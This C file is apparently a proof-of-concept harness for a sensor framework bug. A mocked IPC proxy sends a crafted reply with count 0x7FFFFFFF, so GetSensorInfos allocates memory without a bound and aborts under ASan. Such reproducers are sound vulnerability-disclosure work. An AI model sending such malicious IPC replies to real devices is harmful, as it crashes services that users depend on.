/*
 * Target-Compile PoC: GetSensorInfos Integer Overflow (CWE-190)
 *
 * Target: sensors_sensor_lite — frameworks/src/sensor_agent_proxy.c
 * Vulnerable function: GetSensorInfos (line 139)
 *
 * Trigger path:
 *   GetAllSensorsByProxy(mockProxy, &info, &count)
 *     → InitSensorList(proxy)
 *       → client->Invoke(client, GET_ALL_SENSORS, &request, &owner, Notify)
 *         → MockInvoke crafts IPC reply with count=0x7FFFFFFF
 *           → Notify(owner, 0, &reply)
 *             → GetSensorInfos(owner, &reply)
 *               → ReadInt32(&count) = 0x7FFFFFFF (no upper bound check)
 *               → malloc(sizeof(SensorInfo) * 0x7FFFFFFF)
 *               → allocator OOM abort (64-bit) / integer overflow (32-bit)
 *
 * Oracle: ASan OOM abort — untrusted IPC count used in allocation without bound
 *
 * Build (target-compile):
 *   ./build.sh <sensors_sensor_lite_path> <ohos-toolkit-stubs-path>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include "serializer.h"
#include "ipc_skeleton.h"
#include "iproxy_client.h"
#include "sensor_agent_type.h"
#include "sensor_agent_proxy.h"
#include "log.h"

extern SensorInfo *g_sensorLists;
extern int32_t g_sensorListsLength;

#define SENSOR_SERVICE_ID_GET_ALL_SENSORS 0

static int MockInvoke(struct IClientProxy *proxy, int funcId, IpcIo *request,
                      void *owner, int (*notify)(void*, int, IpcIo*))
{
    (void)proxy; (void)request;

    if (funcId == SENSOR_SERVICE_ID_GET_ALL_SENSORS && notify && owner) {
        char reply_buf[4096];
        IpcIo reply;
        IpcIoInit(&reply, reply_buf, sizeof(reply_buf), 0);

        /* IPC reply wire format for Notify → GetSensorInfos:
         *   [int32 functionId] [int32 retCode] [int32 count]
         *   [uint32 len] [len bytes: SensorInfo data] */
        WriteInt32(&reply, SENSOR_SERVICE_ID_GET_ALL_SENSORS);
        WriteInt32(&reply, 0);
        WriteInt32(&reply, 0x7FFFFFFF);

        SensorInfo fake;
        memset(&fake, 0, sizeof(fake));
        strncpy(fake.sensorName, "FakeSensor", SENSOR_NAME_MAX_LEN - 1);
        uint32_t len = (uint32_t)sizeof(SensorInfo);
        WriteUint32(&reply, len);
        memcpy(reply.bufferCur, &fake, sizeof(SensorInfo));
        reply.bufferCur += sizeof(SensorInfo);
        reply.bufferLeft -= sizeof(SensorInfo);

        size_t written = (size_t)(reply.bufferCur - reply.bufferBase);
        reply.bufferCur = reply.bufferBase;
        reply.bufferLeft = written;

        return notify(owner, 0, &reply);
    }

    if (owner) *((int32_t*)owner) = 0;
    return 0;
}

static int MockQueryInterface(void *iUnknown, int version, void **target)
{
    (void)iUnknown; (void)version; (void)target;
    return 0;
}
static int MockAddRef(void *iUnknown) { (void)iUnknown; return 1; }
static int MockRelease(void *iUnknown) { (void)iUnknown; return 0; }

int main(void)
{
    g_sensorLists = NULL;
    g_sensorListsLength = 0;

    IClientProxy mockProxy;
    mockProxy.QueryInterface = (QueryInterface)MockQueryInterface;
    mockProxy.AddRef = (AddRef)MockAddRef;
    mockProxy.Release = (Release)MockRelease;
    mockProxy.Invoke = (int (*)(struct IClientProxy*, int, IpcIo*, void*,
                                int (*)(void*, int, IpcIo*)))MockInvoke;

    SensorInfo *sensorInfo = NULL;
    int32_t count = 0;
    fprintf(stderr, "[POC] Calling GetAllSensorsByProxy with malicious IPC reply (count=0x7FFFFFFF)\n");
    int32_t ret = GetAllSensorsByProxy((const void *)&mockProxy, &sensorInfo, &count);
    fprintf(stderr, "[POC] GetAllSensorsByProxy returned: %d, count: %d\n", ret, count);

    if (g_sensorLists) {
        free(g_sensorLists);
        g_sensorLists = NULL;
    }
    return 0;
}
